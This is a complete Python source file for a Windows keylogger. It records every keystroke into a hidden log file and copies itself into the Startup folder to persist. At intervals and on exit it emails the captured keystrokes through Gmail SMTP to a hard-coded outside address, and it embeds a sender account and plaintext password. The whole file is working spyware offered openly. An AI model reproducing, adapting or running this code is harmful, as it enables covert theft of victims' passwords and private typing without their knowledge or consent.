from pynput import keyboard
import time, subprocess

mayus = False

max_strokes, n_strokes = 500, 0

"""
Generate an executable at the startup's windows folder so the keylogger can be automatically runned
"""

def infect():
    import os
    from shutil import copy2

    currentDir = os.getcwd()
    currentUser = os.getlogin()

    target = "C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" % currentUser

    if (currentDir != target):
        currentFile = currentDir + "\\keylogger.exe"
        try:
            copy2(currentFile, target)
        except:
            print("exe not found")


"""
Allows to send log via mail (opening a client session using SMTP protocol). If a gmail account is used, enable access of unsafe applications in your google settings

:param sender: mail of the sender
:param sender_password: password of the mail's sender
:param receiver: mail of the receiver
"""


def send_mail(sender, sender_password, reciever):
    import smtplib
    from email.mime.multipart import MIMEMultipart
    from email.mime.text import MIMEText
    from email.mime.base import MIMEBase
    from email import encoders
    import datetime

    server = 'smtp.gmail.com'
    port = 587

    date = datetime.datetime.now()
    date = date.strftime("%c")

    msg = MIMEMultipart("alternative")
    msg["Subject"] = 'Log of ' + date
    msg["From"] = sender
    msg["To"] = reciever

    msg.attach(MIMEText('Download the file', 'plain'))
    attach_file_name = 'log.txt'
    attach_file = open(attach_file_name, 'rb')
    payload = MIMEBase('application', 'octate-stream')
    payload.set_payload((attach_file).read())
    encoders.encode_base64(payload)  # encode the attachment

    payload.add_header('Content-Decomposition', 'attachment', filename=attach_file_name)
    msg.attach(payload)

    s = smtplib.SMTP(server, port)
    s.ehlo()
    s.starttls()
    s.login(sender, sender_password)
    s.sendmail(sender, reciever, msg.as_string())
    s.quit()


"""
Very simple handler of the keyboard listener

:param key: key pressed
"""


def on_press(key):
    global mayus, n_strokes

    f = open('log.txt', "a+")

    n_strokes += 1

    if key == keyboard.Key.esc:
        f.close()
        return False  # stop listener
    try:
        k = key.char  # single-char keys
        if (mayus):
            k = k.upper()
        f.write(k)
        print('Key pressed: ' + k)
    except:
        try:
            k = key.name  # other keys

            if (k == "caps_lock"):
                mayus = not mayus
            if (k == "space"):
                f.write(" ")
            elif (k == "enter"):
                f.write("\n")
            else:
                m = "[" + k + "]"
                f.write(m)
            print('Key pressed: ' + k)
        except AttributeError:  # if a key has no name, raises an error
            f.write("[missing]")

    f.close()

    if(n_strokes==max_strokes):
        send_mail('teamcyber541@gmail.com', 'new_password100', 'teamcyber5412@gmail.com')
        try:
            subprocess.check_call(["attrib", "-H", "log.txt"])
        except:
            pass
        open('log.txt', 'w+').close()
        subprocess.check_call(["attrib", "+H", "log.txt"])
        n_strokes = 0




infect()

try:
    subprocess.check_call(["attrib", "-H", "log.txt"])
except:
    pass

open('log.txt', 'w+').close()
subprocess.check_call(["attrib", "+H", "log.txt"])

listener = keyboard.Listener(on_press=on_press)

listener.start()  # start to listen on a separate thread
listener.join()  # remove if main thread is polling self.keys

send_mail('teamcyber541@gmail.com', 'new_password100', 'teamcyber5412@gmail.com')